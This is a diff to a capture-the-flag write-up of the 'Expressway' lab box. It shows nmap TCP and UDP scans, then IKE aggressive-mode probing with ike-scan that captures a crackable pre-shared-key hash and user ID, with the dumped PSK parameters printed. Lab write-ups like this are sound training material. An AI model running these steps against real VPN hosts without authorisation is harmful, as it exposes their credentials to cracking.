@@ -54,10 +54,10 @@ matrix_ctf: 6
 For this Box, I started with the usual nmap. The scan outputted:
 
 ```zsh
-nmap -p- --min-rate 5000 -n -Pn <Expressway_IP>
+nmap -p- --min-rate 5000 -n -Pn 10.129.1.13
 ```
-```
-Nmap scan report for <Expressway_IP>
+```zsh
+Nmap scan report for 10.129.1.13
 Host is up (0.049s latency).
 Not shown: 65534 closed tcp ports (conn-refused)
 PORT   STATE SERVICE
@@ -69,10 +69,10 @@ Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
 Since the only open port was 22 (ssh), I decided to run nmap again, but in this case scanning for UDP.  Now we got:
 
 ```zsh
-sudo nmap -sU --top-ports 100 -n -Pn <Expressway_IP>
+sudo nmap -sU --top-ports 100 -n -Pn 10.129.1.13
 ```
 ```zsh
-Nmap scan report for <Expressway_IP>
+Nmap scan report for 10.129.1.13
 Host is up (0.044s latency).
 Not shown: 96 closed udp ports (port-unreach)
 PORT     STATE         SERVICE
@@ -98,7 +98,7 @@ Ending ike-scan 1.9.6: 1 hosts scanned in 0.914 seconds (1.09 hosts/sec).  1 ret
 Since we couldn't retrieve the Hash, I repeated the scan, but with the -A (agressive mode) flag. The Hash was captured:
 
 ```zsh
-sudo ike-scan 10.129.1.13
+sudo ike-scan -A 10.129.1.13
 ```
 ```
 10.129.1.13     Aggressive Mode Handshake returned HDR=(CKY-R=4e95499198514d92) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)  
@@ -108,6 +108,9 @@ Ending ike-scan 1.9.6: 1 hosts scanned in 0.094 seconds (10.64 hosts/sec).  1 r
 
 We can see that now we captured the Hash(20 bytes) and we have the ID (ike@expressway.htb), we can try to crack the Hash, since SHA1 and 3DES are old and vulnerable. Just adding the -P flag was enough:
 
+```zsh
+sudo ike-scan -P -A 10.129.1.13
+```
 ```
 IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
 73803f7bb6a249be19a3825dcfb89df2d9ffb855ebde3bfc5dad7fca1f7ce3d8295072f490f29247e07bd79d3b742fffd1bfc0c4a66226f2766a9cf183457c7fcb0e9bd8634f3ab1d1bc47bc4918be76728f9bcf928c1ca2c0a8aafff03e9822aadbfd4d43bbdec0c44f4b9056d56d062adfd7fa881d5bbdbe94d979d2e10696:19d164c4f2f7d78336e1b51d28e8c7a37f68fca5fb0979859bd4271867c2b109718e241bede36a70c89b310d308e38f0dbe6b980a4f78313f440078a4b9ae96607f843526896b8338668d351c0c3f4d2afb38c8b7b9f5a214b8fbfafab849b428ce02ad71bf95904979e79b3413f99537a577f969eb8463d243404c7fe93fa92:804e263a94981c03:2cd7673a8b4cc846:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:9d1c9af33c78542321055448d331bf6eea5c4f6f:d9d6baa6061d2bcc22b2cbff433eeeecc4773ae0236b2643976d97d6aacc60ae:dd6cadafb1bd5a495b3e845c0a398365e37d86c9
